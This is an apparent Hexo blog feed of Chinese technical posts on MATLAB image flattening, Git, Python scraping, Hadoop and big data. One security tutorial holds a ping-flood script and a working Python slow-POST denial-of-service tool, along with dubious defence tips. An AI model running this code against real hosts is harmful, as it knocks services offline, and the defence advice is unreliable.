[r,c,p]=size(image);            %获取图片分辨率大小，大小为m*n                 B = reshape(image,1,r*c*p);        %根据图像分辨率拉伸成为长度m*n的向量                 data(j,1:r*c*p) = B;            end end% xlswrite( "D:\ONE.xlsx",data)  %将一维化之后的图像数据保存为xlsx文件</code></pre><h3 id="希尔伯特曲线法"><a href="#希尔伯特曲线法" class="headerlink" title="希尔伯特曲线法"></a>希尔伯特曲线法</h3><p>相比直接拉伸，用希尔伯特曲线的方法将图像一维化可以保留图像结构特征</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">%leftright.mfunction [y] = leftright(x)    sizecol = size(x, 2);    y = zeros(sizecol);    for i = 1 : sizecol        y(:, i) = x(:, sizecol + 1 - i);    endend</code></pre><pre class=" language-lang-matlab"><code class="language-lang-matlab">% show_curve.mfunction show_curve(H)size_col = size(H, 2);map = zeros(size_col * size_col, 3);count = 1;for i = 1 : size_col    for j = 1 : size_col        map(count, 1) = i;        map(count, 2) = j;        map(count, 3) = H(i, j);        count = count + 1;    endendmap = sortrows(map, 3);plot(map(:,1), map(:, 2));axis([0 size_col + 1 0 size_col + 1]);end</code></pre><pre class=" language-lang-matlab"><code class="language-lang-matlab">H2 = [1 2; 4 3];H = H2;for i = 1 : 9    if mod(i, 2) == 0        H = [H, 4^i + H';             (4^(i + 1) + 1) - updown(H), (3 * 4^i + 1) - (leftright(H)')];    else        H = [H, (4^(i + 1) + 1) - leftright(H);             (4^i) + H', (3 * 4^i + 1) - leftright(H')];    end    Hend</code></pre><pre class=" language-lang-matlab"><code class="language-lang-matlab">% updwon.mfunction [y] = updown(x)    sizerow = size(x, 1);    y = zeros(sizerow);    for i = 1 : sizerow        y(i, :) = x(sizerow + 1 - i, :);    endend</code></pre><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><a href="https://github.com/clayliu" target="_blank" rel="noopener">@ClayLiu</a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.cjig.cn/jig/ch/reader/view_abstract.aspx?file_no=20060119" target="_blank" rel="noopener">Hilbert曲线扫描矩阵的生成算法及其MATLAB程序代码</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git bash常用操作汇总</title>
      <link href="2020/05/04/git-bash-chang-yong-cao-zuo-hui-zong/"/>
      <url>2020/05/04/git-bash-chang-yong-cao-zuo-hui-zong/</url>
      
        <content type="html"><![CDATA[<h3 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h3><p>在你存放项目代码的文件夹，输入代码新建Git本地仓库</p><pre><code>  git init</code></pre><p>新建之后会出现一个git文件夹，并且存放项目代码的文件夹会出现一个<strong>绿色的勾</strong>,表示已经同步到本地分支；命令行用户最后面有个<strong>master</strong>，表示在本地的master分支。</p><p> 此时可以通过命令git branch查看本地分支</p><pre><code> git branch  #查看本地分支 git branch -r  #查看远程分支 git branch -a  #查看所有分支</code></pre><p>在这里先不介绍远程，先学会本地版本控制</p><p>如果需要创建其他分支，可以用切换分支的命令加上参数创建分支</p><pre><code>  git checkout dev #切换到本地的dev分支  git checkout -b dev #创建并切换到本地的dev分支</code></pre><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>修改文件后，<strong>绿色的勾</strong>会变成<strong>红色的感叹号</strong>，表示更新到git的分支(如果切换到了master分支，就表示该文件没有更新到master分支，如果切换到dev分支就表示该文件没有更新到dev分支)</p><pre><code>  git add -A  #将所有文件添加到暂存区  git commit -m &quot;first commit&quot; #这一步是备注，注意这个步骤一定要有，否则会提交失败  git push -u origin master #表示提交到远程master分支，在此只是因为没有关联远程分支暂且不管</code></pre><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>如果某个分支要更新到跟另一个分支的文件一样，使用merge</p><p>假设现在是在本地dev分支</p><pre><code>  git checkout master #切换到本地master  git merge dev #把本地dev分支合并到当前本地分支(master)中</code></pre><h3 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h3><pre><code>git reflog    #会显示idgit  reset --hard  commit_id    #commit_id填写git reflog显示的id</code></pre><h3 id="关联远程"><a href="#关联远程" class="headerlink" title="关联远程"></a>关联远程</h3><pre><code>  git checkout master  git remote add origin https://github.com/coneycode/hexo-git-backup.git #添加远程仓库  git fetch origin master #取回(名称为)origin服务器的master分支，即拉取远程master分支</code></pre><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><pre><code>git init   # 本地创建仓库 git add -A  # 提交所有文件git commit -m &quot;first commit&quot;  # 提交文件至本地缓存区git remote add origin https://github.com/githubusername/githubrepositories.git #添加远程仓库git push -u origin master #提交代码至远程仓库master分支</code></pre><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200714064123166.png" alt="image-20200714064123166"></p><p>解决办法：</p><p>先</p><pre><code>git pull --rebase origin master</code></pre><p>再</p><pre><code>git push origin master</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">git官方中文文档</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python异常处理</title>
      <link href="2020/04/26/python-yi-chang-chu-li/"/>
      <url>2020/04/26/python-yi-chang-chu-li/</url>
      
        <content type="html"><![CDATA[<h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><pre class=" language-lang-python"><code class="language-lang-python">    try:        #运行可能产生异常的代码        except：        #如果try后面的代码运行错误则运行这部分代码</code></pre><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><pre class=" language-lang-python"><code class="language-lang-python">    try:    #运行可能产生异常的代码    except：    #如果try后面的代码运行错误则运行这部分代码                  else：    #如果没有异常发生</code></pre><h3 id="没有异常处理的程序"><a href="#没有异常处理的程序" class="headerlink" title="没有异常处理的程序"></a>没有异常处理的程序</h3><p>以爬取王者荣耀图片为例子</p><pre class=" language-lang-python"><code class="language-lang-python">import urllib.requestimport os# http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/191/191-bigskin-1.jpg 王者荣耀图床地址   文件夹191～529 -1表示皮肤 ，之后是-2 、-3...for num in range(105,600):    # try:        path = r'D:\文档\code\web前端\王者荣耀图库\皮肤\ '        # os.mkdir(path + str(num))         #创建文件夹        response = urllib.request.urlopen("http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/"+str(num)+"/"+str(num)+"-bigskin-1"+".jpg")  #图片地址        print(response)        wangzhe_img = response.read()        with open('D:\文档\code\web前端\王者荣耀图库\皮肤\ '+ str(num) + '.jpg','wb') as f:            f.write(wangzhe_img)    # except:    #     continue</code></pre><h3 id="有异常处理的程序"><a href="#有异常处理的程序" class="headerlink" title="有异常处理的程序"></a>有异常处理的程序</h3><p>按照上述方式爬取图片，会遇到当网址无法打开则无法进行下一步的问题（王者荣耀图片网站并不是191~529都有图片，有些英雄之间的编号可能有间隔，因而运行程序遇到这种情况会出现error）</p><p>为解决该问题，使用try异常处理，当遇到无法打开的网址时，直接跳过继续循环的下一个步骤，如：</p><pre class=" language-lang-python"><code class="language-lang-python">import urllib.requestimport os# http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/191/191-bigskin-1.jpg 王者荣耀图床地址   文件夹191～529 -1表示皮肤 ，之后是-2 、-3...for num in range(105,600):    try:        path = r'D:\文档\code\web前端\王者荣耀图库\皮肤\ '        # os.mkdir(path + str(num))         #创建文件夹        response = urllib.request.urlopen("http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/"+str(num)+"/"+str(num)+"-bigskin-1"+".jpg")  #图片地址        print(response)        wangzhe_img = response.read()        with open('D:\文档\code\web前端\王者荣耀图库\皮肤\ '+ str(num) + '.jpg','wb') as f:            f.write(wangzhe_img)    except:        continue</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hadoop大数据生态安装</title>
      <link href="2020/04/26/hadoop-da-shu-ju-sheng-tai-an-zhuang/"/>
      <url>2020/04/26/hadoop-da-shu-ju-sheng-tai-an-zhuang/</url>
      
        <content type="html"><![CDATA[<p><center># Hadoop学习：大数据生态安装  </center></p><h2 id="Hadoop、spark安装"><a href="#Hadoop、spark安装" class="headerlink" title="Hadoop、spark安装"></a>Hadoop、spark安装</h2><p>Ubuntu18.04 照着这篇教程来啥问题也没有：<br><a href="https://m.linuxidc.com/Linux/2019-12/161628.htm" target="_blank" rel="noopener">Ubuntu 18.04下搭建单机Hadoop和Spark集群环境</a>  </p><h2 id="关于系统"><a href="#关于系统" class="headerlink" title="关于系统"></a>关于系统</h2><p>考虑到可能大多数同学用的都是Windows系统，所以这里附上搭建linux系统的办法： </p><h3 id="win10的linux子系统（WSL）"><a href="#win10的linux子系统（WSL）" class="headerlink" title="win10的linux子系统（WSL）"></a>win10的linux子系统（WSL）</h3><p>WSL是默认安装在C盘的，如果不想占用C盘空间，就需要在<strong>安装子系统之前</strong>建立软连接：（若不在乎C盘空间请忽略）：<br><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">Windows下Linux子系统迁移到非系统盘 原创</a></p><p><a href="https://blog.csdn.net/qq_43457125/article/details/94897476?from=singlemessage" target="_blank" rel="noopener">win10系统如何开启子系统 （详细）</a></p><p><a href="https://zhuanlan.zhihu.com/p/35735513?from=singlemessage" target="_blank" rel="noopener">从安装到基本设置——Win10子系统入门简明教程</a></p><p>以上任选其一</p><p>之后是图形界面，对新手来说没有图形界面是挺累skr人的，用过之后尽量早点丢开图形界面使用命令行：<br><a href="https://baijiahao.baidu.com/s?id=1596652006568524478&amp;wfr=spider&amp;for=pc&amp;from=singlemessage" target="_blank" rel="noopener">Win10子系统安装图形化界面的两种方法</a><br>可以把这里的Debian当成Ubuntu，命令行是一样的</p><h3 id="双系统"><a href="#双系统" class="headerlink" title="双系统"></a>双系统</h3><p>因为显卡驱动的原因，目前主流的显卡对Linux的支持都不好，所以安装会黑屏。  一般来说第一次开机禁用显卡就好了。    以下仅说明黑屏解决办法：  </p><p><a href="https://blog.csdn.net/cheneykl/article/details/79111618" target="_blank" rel="noopener">安装ubuntu时黑屏三种解决办法</a></p><p><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=174315&amp;from=singlemessage" target="_blank" rel="noopener">AMD锐龙 2200g安装和使用deepin</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全攻防基础</title>
      <link href="2020/04/26/ji-suan-ji-bing-du-gong-fang-ji-chu/"/>
      <url>2020/04/26/ji-suan-ji-bing-du-gong-fang-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>先明确本篇文章旨在让有意学习者了解计算机病毒入侵的手段和防护办法，请各位学习者自觉遵循中华人民共和国相关法律法规。  其次，如果认为“黑客是坏蛋”，建议先看看<a href="https://m.baidu.com/sf_bk/item/%E9%BB%91%E5%AE%A2/118396?ms=1&amp;rid=11053482354809685763" target="_blank" rel="noopener">黑客骇客谁是坏蛋？</a>  </p><p>其实关于入侵技术的文章一直都是比较少，可能是因为现在国家企业对网络安全越来越重视了，越来越多的技术人员从事网络安全防护，病毒入侵也不似以前那么猖狂。  </p><h1 id="计算机病毒介绍"><a href="#计算机病毒介绍" class="headerlink" title="计算机病毒介绍"></a>计算机病毒介绍</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>  狭义上的计算机病毒是指能够进行自我传播，需要用户敢于来触发执行的破坏性程序或代码。</p><h2 id="计算机病毒分类"><a href="#计算机病毒分类" class="headerlink" title="计算机病毒分类"></a>计算机病毒分类</h2><ul><li><p>按照计算机病毒攻击的系统分类：<br>（1）攻击Windows系统的病毒<br>（2）攻击DOS系统的病毒<br>（3）攻击UNIX系统的病毒<br>（4）攻击Operating System/2系统的病毒  </p></li><li><p>按照计算机病毒的链结方式分类<br>（1）源码型病毒<br>（2）嵌入型病毒<br>（3）外壳型病毒<br>（4）操作系统型病毒   </p></li><li><p>按照计算机病毒的破坏情况分类<br>（1）良性计算机病毒<br>（2）恶性计算机病毒<br>（3）引导型计算机病毒  </p></li><li><p>按照计算机病毒的传播媒介分类<br>（1）单机病毒<br>（2）网络病毒  </p></li></ul><h2 id="黑客术语"><a href="#黑客术语" class="headerlink" title="黑客术语"></a>黑客术语</h2><p>蠕虫：一段能进行自我传播，无须用户干预而可以自动触发执行额破坏性程序或代码。</p><p>木马：是指附着在应用程序上或单独存在的一些恶意程序，他可以利用网络远程响应网络的另一端的控制程序的控制命令，实现对被植入木马的目标计算机的控制或者窃取感染木马程序 的计算机上的机密资料。</p><p>后门：允许攻击者绕过系统中常规安全控制机制的程序，它按照攻击者自己的意图提供通道。</p><p>僵尸（bot）：是指实现恶意控制功能的程序代码。大量被植入僵尸程序的电脑通过僵尸控制服务器便可以形成僵尸网络。</p><p>rootkit：室友很多有用的小程序组成的工具包，使得攻击者能够保持访问计算机上具有最高权限的用户“root”。 换言之 ，rootkit是可以持久的，无法被检测地存在于计算机的一组程序或代码。</p><p>间谍软件：以主动收集用户个人信息，相关机密文件或隐私数据为主，收集到的数据会主动传送到指定服务器 。</p><p>流氓软件：具有一定的实用价值但具备电脑病毒和黑客软件的部分特征的软件</p><p>exploit：精心设计的用于利用特定漏洞以及对目标系统进行控制的程序</p><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的方法。  </p><p>后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。  </p><p>跳板：使用肉鸡IP来实施攻击的其他目标，以便更好的隐蔽自己的身份信息。  </p><p>旁站入侵：即同服务器下的网站入侵，入侵之后可以通过提权跨目录手段拿到目标网站的权限。(常见的工具有：WebRobot、御剑、明小子和web在线查询等) 。 </p><p><a href="https://blog.csdn.net/qq_40769535/article/details/89574422" target="_blank" rel="noopener">更多黑客术语查看</a>  </p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ul><li>首先，安装Python<br>相信这一步大家都轻车熟路的啦，在这里略过……<br>（PS：以下演示环境为Python3.7）<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650202449&amp;idx=4&amp;sn=461cd7441267ada4d4c5662d74ca4494&amp;chksm=8ee141bdb996c8ab0b586bfb64e97855d14f597ac9d27035fee52d32a24f7560bbce3cbef0a2&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">安装Python3.7</a>  </li></ul><ul><li>安装虚拟机并安装Windows系统镜像<br>攻击别人的电脑或网站犯法，所以自己搭建个虚拟机吧（说机不说吧，文明你我他）òᆺó<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203072&amp;idx=1&amp;sn=b21a1c1d4526cb578efa7aeb74f4d857&amp;chksm=8ee1432cb996ca3ae786c341458b2d52d9af516134975a43180d904e36c14253596f28be7996&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">安装VMware</a><br><a href="https://blog.csdn.net/qq3399013670/article/details/81937412" target="_blank" rel="noopener">安装VitrualBox</a><br>以上安装虚拟机方式任选其一，安装完成记得下载iso文件安装系统  </li></ul><h2 id="ping网络堵塞"><a href="#ping网络堵塞" class="headerlink" title="ping网络堵塞"></a>ping网络堵塞</h2><p>首先，需要获取攻击的ip地址（这个是最基本的，连没有ip地址都不知道，就啥也搞不了）。<br>Windows系统获得本机的ip地址只需要打开命令提示符（cmd）并输入ipconfig就可以了。但是攻击的时候需要目标的ip地址，这个时候就需要抓包工具啦。<br><a href="https://blog.csdn.net/gufenchen/article/details/90895856" target="_blank" rel="noopener">常用的几款抓包工具</a> ，找一个你觉得顺眼的工具用一下吧！（这里说一下，黑客的软件，不能随便下载，指不准在软件里做了手脚打包发出来的，所以尽量还是去可靠的渠道下载黑客工具吧，例如官网~）<br>如果是获取网站ip地址，直接打开cmd，ping一下域名就行了。<br><code>ping baidu.com</code>   </p><p><center>如图，得到的   就是ip地址</center><br>在这里来个补充，ping一下ip，原理上是本机给对方ip地址发送请求，如果对方ip收到请求那么就给本机返回数据包~在这过程中对方ip地址对应的服务器（电脑）</p><p>试想，如果一直发送会不会造成网络堵塞？<br>因此有了以下操作：  </p><p>PING -t ip<br>注：这样可以PING指定的IP到永远，除非你停止它。很多初级黑客喜欢用这个参数来进行网络堵塞的攻击。<br>PING -l 大小 ip<br>注：这样可以设置发送包大小<br>PING -n 次数 ip<br>注：这样可以设置次数。 </p><p><code>PING -n 10 -l 10 baidu.com</code> </p><p>图</p><p>利用ping造成网络堵塞的Python3.7代码</p><pre class=" language-lang-python"><code class="language-lang-python">    import os    import socket    import time    ip = input("请输入IP：")    os.system("ping -t -l 50 " + ip)</code></pre><h2 id="分布式拒绝服务攻击（DDos）"><a href="#分布式拒绝服务攻击（DDos）" class="headerlink" title="分布式拒绝服务攻击（DDos）"></a>分布式拒绝服务攻击（DDos）</h2><p>分布式拒绝服务攻击可以使很多的计算机在同一时间遭受到攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>来看看Python3.7的DDos代码</p><pre class=" language-lang-python"><code class="language-lang-python">    import socket    import time    import threading    #Pressure Test,ddos tool    #---------------------------    MAX_CONN=20000    PORT=80    HOST=""#在双引号里输入对方IP或域名，要保证他联网了或开机了.    PAGE="/index.php"    #---------------------------    buf=("POST %s HTTP/1.1\r\n"    "Host: %s\r\n"    "Content-Length: 10000000\r\n"    "Cookie: dklkt_dos_test\r\n"    "\r\n" % (PAGE,HOST))    socks=[]    def conn_thread():        global socks        for i in range(0,MAX_CONN):            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)            try:                s.connect((HOST,PORT))                s.send(buf.encode())                print ("Send buf OK!,conn=%d\n"%i)                socks.append(s)            except Exception as ex:                print ("Could not connect to server or send error:%s"%ex)                time.sleep(0.1)    #end def    def send_thread():        global socks        while True:            for s in socks:                try:                    s.send("f".encode())                    #print "send OK!"                except Exception as ex:                    print ("Send Exception:%s\n"%ex)                    socks.remove(s)                    s.close()            time.sleep(0.1)    #end def    conn_th=threading.Thread(target=conn_thread,args=())    send_th=threading.Thread(target=send_thread,args=())    conn_th.start()    send_th.start()</code></pre><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>最简单最基础的网络攻击讲完了，那么接下来该学学学习如何保护自己的计算机啦(*σ´∀`)σ  </p><ul><li><p>如果是Win10，打开自带的Defender<br>傻瓜式设置，按照系统的提示把防火墙什么的都打开  </p></li><li><p>无特殊情况不装360安全卫士，并且卸载360的所有软件    </p></li><li><p>尽量不要安装破解软件  </p></li><li><p>看到明显的恶意捆绑软件不要安装，以及defender提示病毒的软件也尽量不要安装。    </p></li><li><p>不进不明不网站，不收奇怪邮件。下载完压缩包文件后先进行病毒扫描  </p></li><li><p>关闭不必要的端口  </p></li></ul><h2 id="如何应对攻击"><a href="#如何应对攻击" class="headerlink" title="如何应对攻击"></a>如何应对攻击</h2><p>接下来，我们来看看如何应对攻击  </p><p><strong>应对DDoS攻击</strong>：<br>其实目前对上DDoS攻击都是个很烦事情。<br>要想完全不受DDos攻击的危害——断网。<br>打开cmd窗口，输入net stop Service,关闭Windows网络服务。<br>关闭后，即可免遭危害。（滑稽）</p><p><strong>应对DNS欺骗</strong>：<br>重启网络路由，将浏览器全部还原为原设置。</p><p><strong>应对ARP欺骗</strong>：<br>重启网络路由，将浏览器（需要网络的软件）全部还原为默认设置。接着打开cmd窗口，输入arp -a，如果显示：没有ARP缓存表，说明你还在遭遇此攻击，否则你就已脱离了危险。接着，输入ping -t -l 10 127.0.0.1 ,不停地PING轮回IP，使其防止网络堵塞，还可能会摆脱危险。接着，打开资源监视器，找到网络，看看是谁在不断给你发送ARP数据包。找到后，立即找专业人员进行询问和修理，并且将此IP提交给专业人员。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/tiantian520ttjs/article/details/103107836" target="_blank" rel="noopener">[1] Python3.7黑帽编程——病毒篇（基础篇）：tiantian520_tt</a><br><a href="http://m.elecfans.com/article/838613.html" target="_blank" rel="noopener">[2] 计算机病毒类型：发烧友学院 </a><br><a href="https://blog.csdn.net/weixin_38635069/article/details/80557636" target="_blank" rel="noopener">[3]各类计算机病毒介绍：薛定谔的小橙子</a><br><a href="https://www.cnblogs.com/yyhh/p/5140852.html" target="_blank" rel="noopener">[4] Fiddler抓包工具总结：代码改变世界</a><br><a href="https://blog.csdn.net/gufenchen/article/details/90895856" target="_blank" rel="noopener">[5]常用的几款抓包工具：白清羽</a><br><a href="https://blog.csdn.net/qq_41658919/article/details/82501760" target="_blank" rel="noopener">[6] 黑客的基础知识：残念(￣▽￣)／王司徒</a><br><a href="https://blog.csdn.net/tiantian520ttjs/article/details/103435385" target="_blank" rel="noopener">[7]计算机网络安全——保护自己的计算机（基础）</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据的概念及应用</title>
      <link href="2020/04/26/da-shu-ju-de-gai-nian-ji-ying-yong/"/>
      <url>2020/04/26/da-shu-ju-de-gai-nian-ji-ying-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>大数据很火热，但实际上能准确说出的概念的人很少。<br>为了为之后学习Hadoop打下概念基础以便更容易掌握学习框架，先来看看维基百科和百度百科介绍大数据：</p><p><strong>维基百科中文</strong>：大数据（英语：Big data），又称为巨量资料，指的是在传统数据处理应用软件不足以处理的大或复杂的数据集的术语。</p><p>大数据也可以定义为来自各种来源的大量非结构化或结构化数据。从学术角度而言，大数据的出现促成广泛主题的新颖研究。这也导致各种大数据统计方法的发展。大数据并没有统计学的抽样方法；它只是观察和追踪发生的事情。因此，大数据通常包含的数据大小超出传统软件在可接受的时间内处理的能力。由于近期的技术进步，发布新数据的便捷性以及全球大多数政府对高透明度的要求，大数据分析在现代研究中越来越突出。$^{[1]}$</p><p><strong>百度百科</strong>：大数据（big data），IT行业术语，是指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。<br>大数据的5V特点（IBM提出）：Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）、Veracity（真实性）。$^{[2]}$</p><p>也许有人搜索一下百科就以为这是大数据的定义，<strong>但</strong>没人说这就是大数据的定义，这两段是简要地概括一下大数据的概念、结构、特性等。事实上，个人感觉大数据的概念不是一两句话就能讲清的。不然的话，林子雨老师就不会用一整整一章的内容来讲解大数据的概念。$^{[3]}$  </p><p>如果多搜集资料你就会发现，每个人对大数据大数据的讲解都有些许不同，也许一千个读者眼里的哈姆雷特是一样的，但每个读者或多或少表达的倾向不一样。同理，大数据的概念我说是说不清的了，这辈子都说不清的了，但请记住大数据的几点特点：<strong>数据量大、数据类型繁多、处理速度快、价值密度低</strong>。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>大数据无处不在，包括金融、汽车、零售、餐饮、电信、能源、政务、医疗、体育、娱乐等在内的社会各行各业都已经融入了大数据的印迹。具体案例在此不详细介绍啦，有兴趣可以看<a href="https://www.zhihu.com/question/38446718" target="_blank" rel="noopener">知乎问题：基于大数据的成功应用有哪些？</a>  </p><h1 id="大数据技术的不同层面及其功能"><a href="#大数据技术的不同层面及其功能" class="headerlink" title="大数据技术的不同层面及其功能"></a>大数据技术的不同层面及其功能</h1><p><strong>数据采集</strong>：利用ETL工具将分布的、异构数据源中的数据如关系数据、平面数据文件等，抽取到临时中间层后进行清洗、转换、集成，最后加载到数据仓库或数据集市中，成为联机分析处理、数据挖掘的基础；或者也可以把实时采集的数据作为流计算系统的输入，进行实时处理分析。  </p><p><strong>数据存储和管理</strong>： 利用分布式文件系统、数据仓库、关系数据库、NoSQL数据库、云数据库等，实现对结构化、半结构化和非结构化海量数据的存储和管理。  </p><p><strong>数据处理与分析</strong>： 利用分布式并行编程模型和计算框架，结合机器学习和数据挖掘算法，实现对海量数据的处理和分析；对分析结果进行可视化呈现，帮助人们更好地理解数据、分析数据。  </p><p><strong>数据隐私和安全</strong>：在从大数据中挖掘潜在的巨大商业价值和学术价值的同时，构建隐私数据保护体系和数据安全体系，有效保护个人隐私和数据安全。  </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/308a4168628691ae73290e5ede3f121.jpg" alt="大数据核心技术：分布式系统"></p><h1 id="数据计算模式及产业"><a href="#数据计算模式及产业" class="headerlink" title="数据计算模式及产业"></a>数据计算模式及产业</h1><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/c8930b782b303b36f4200318b631d4b.jpg" alt="大数据计算模式及其代表产品"></p><p>上述大数据产品中有不少就是后续的篇章里将介绍如何使用的，MapReduce、hive等，在此引用某一案例来了解下批处理和流计算。  </p><p>大数据处理系统通常采用并行化的策略进行数据处理，每个阶段由与分区数相同个数的任务组成，一个任务负责处理一个分区，各个任务之间相互独立执行，不会发生数据交换。<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/9bf808f7f216a8477df1f13b2fd8acb.jpg" alt="物理数据流图"></p><ul><li>批处理</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/f100169fa907362bd568b22998c3bd9.jpg" alt="批处理引擎中的物理数据流图"></p><p>在批处理引擎中，一个物理数据流图通常被划分为多个阶段，阶段之间根据依赖关系按序执行，一个阶段只有等其依赖的所有阶段都执行结束后才能开始执行。<br>例如，在基于批处理引擎的Spark系统中，将每个逻辑数据流图根据给定的并行度转换为物理数据流图后，系统会根据数据交换将该物理数据流图划分为多个阶段按序执行。如图3所示，因为在按键值分组顶点处发生数据交换，所以整个物理数据流图在此处被切分，形成阶段0和阶段1两个阶段。其中，阶段1中的数据处理依赖于阶段0处理后的中间结果，即2个阶段的执行存在先后顺序，阶段1只有在阶段0的处理全部完成后才能开始执行。在阶段0中，系统启动3个线程分别处理相互独立的3个分区中的数据，并将得到的中间结果存储在3个线程各自的本地磁盘上。等到阶段0中的3个线程都完成处理后，系统开始进行阶段1的处理，阶段1中启动2个线程分别负责2个分区的数据，每个线程通过网络从阶段0的中间结果处获取属于自己的数据进行后续处理。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2d91dd7c6becb6ffae3ee6da76ffd9b.jpg" alt="流计算引擎中的物理数据流图"></p><p>在流计算引擎中，物理数据流图不会被划分为多个阶段。任务之间的数据交换不需要将中间结果数据先写入磁盘再发送给下游任务，而是在处理完一条数据后立即将其发送给下游任务。</p><h2 id="大数据产业"><a href="#大数据产业" class="headerlink" title="大数据产业"></a>大数据产业</h2><ul><li>大数据产业是指一切与支撑大数据组织管理和价值发现相关的企业经济活动的集合。</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/b846b8e10cfe5728b369505dd0cd4a6.jpg" alt=""></p><h2 id="大数据产品市场调查"><a href="#大数据产品市场调查" class="headerlink" title="大数据产品市场调查"></a>大数据产品市场调查</h2><p>大数据平台市场分布对==就业==等或许有些影响（也许、可能、大概），毕竟供求决定价格。上面已经介绍了一些大数据计算模式和产品，那么现在就来看看调查报告吧。</p><h3 id="大数据技术应用场景相对单一"><a href="#大数据技术应用场景相对单一" class="headerlink" title="大数据技术应用场景相对单一"></a>大数据技术应用场景相对单一</h3><ul><li>77%的企业在运用大数据技术</li><li>目前61%的企业对大数据的应用更多地体现在统计分析、报表及数据可视化上</li><li>Spark、Redis和Kafka正在成为企业大数据平台通用技术组件。</li></ul><h3 id="企业构建大数据平台的主要方式"><a href="#企业构建大数据平台的主要方式" class="headerlink" title="企业构建大数据平台的主要方式"></a>企业构建大数据平台的主要方式</h3><p>随着分布式计算和云平台的逐步成熟，目前大部分公司都有能力搭建自己的大数据平台。调研数据显示，81% 企业在进行大数据相关的开发和应用，50% 的企业选择私有云解决方案来部署大数据应用，28% 的企业选择自主研发。私有云部署解决方案是企业构建大数据平台的主要方式。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224530412.png" alt="企业大数据平台构建方式分布"></p><h3 id="企业使用-Hadoop-版本搭建数据平台情况"><a href="#企业使用-Hadoop-版本搭建数据平台情况" class="headerlink" title="企业使用 Hadoop 版本搭建数据平台情况"></a>企业使用 Hadoop 版本搭建数据平台情况</h3><p>调查报告发现，有 30% 以上的企业并没有使用相对成熟的 Hadoop 